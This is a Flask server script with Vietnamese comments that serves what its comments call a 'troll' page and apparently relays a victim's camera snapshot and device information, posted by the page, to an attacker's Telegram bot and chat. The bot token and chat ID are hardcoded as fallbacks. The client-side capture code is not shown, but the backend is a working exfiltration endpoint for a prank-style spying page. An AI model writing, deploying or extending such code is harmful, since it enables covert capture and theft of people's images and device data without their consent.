# -*- coding: utf-8 -*-
# Flask app chạy được trên cả Termux (local) và Vercel (serverless)
import os
import requests
from flask import Flask, request, jsonify, render_template

app = Flask(__name__, template_folder="templates")

# cấu hình telegram — đọc từ env, fallback về giá trị đã inject
TG_TOKEN = os.environ.get("TG_TOKEN", "8811652774:AAEmCsPkcfQyAyJll2km1m2F5MblQ4miGp8")
TG_CHAT  = os.environ.get("TG_CHAT",  "8003369858")


# route gốc trả template troll
@app.route("/")
def root():
    return render_template("index.html")


# endpoint nhận ảnh base64 + info từ client
@app.route("/api/upload", methods=["POST"])
def upload():
    data = request.get_json(silent=True) or {}
    img_b64 = data.get("image", "")
    info    = data.get("info", "")

    # gửi ảnh qua telegram sendPhoto
    if img_b64:
        try:
            requests.post(
                f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto",
                data={
                    "chat_id": TG_CHAT,
                    "photo": "data:image/jpeg;base64," + img_b64,
                },
                timeout=10,
            )
        except Exception as e:
            print("sendPhoto err:", e)

    # gửi text info thiết bị
    if info:
        try:
            requests.post(
                f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                data={"chat_id": TG_CHAT, "text": info},
                timeout=10,
            )
        except Exception as e:
            print("sendMessage err:", e)

    return jsonify({"ok": True})


# chạy local trên termux
if __name__ == "__main__":
    # host 0.0.0.0 để truy cập từ thiết bị khác trong LAN
    app.run(host="0.0.0.0", port=5000, debug=False)